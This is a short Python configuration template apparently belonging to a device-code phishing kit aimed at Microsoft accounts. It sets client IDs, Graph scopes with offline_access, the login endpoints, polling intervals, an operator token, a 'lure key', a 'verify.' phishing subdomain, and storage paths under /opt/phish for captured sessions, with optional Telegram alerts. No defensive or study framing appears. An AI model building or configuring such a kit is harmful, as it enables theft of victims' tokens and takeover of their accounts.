# config.template.py — install.sh substitutes @@DOMAIN@@, @@OPERATOR_TOKEN@@, @@LURE_KEY@@

TENANT = "common"
MODE = "personal"

CLIENT_ID_PERSONAL = "04f0c124-f2bc-4f59-8241-bf6df9866bbd"
CLIENT_ID_WORK     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
CLIENT_ID_CUSTOM   = ""

CLIENT_ID = CLIENT_ID_PERSONAL

SCOPE = "https://graph.microsoft.com/.default offline_access"

AUTH_URL  = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

POLL_DEFAULT  = 5
POLL_SLOWDOWN = 5

DB_PATH  = "/opt/phish/sessions.db"
LOG_PATH = "/opt/phish/captures.log"

PUBLIC_BASE = "https://verify.@@DOMAIN@@"

OPERATOR_TOKEN = "@@OPERATOR_TOKEN@@"

LURE_KEY = "@@LURE_KEY@@"

TELEGRAM_ENABLED = False
TELEGRAM_TOKEN   = ""
TELEGRAM_CHAT_ID = ""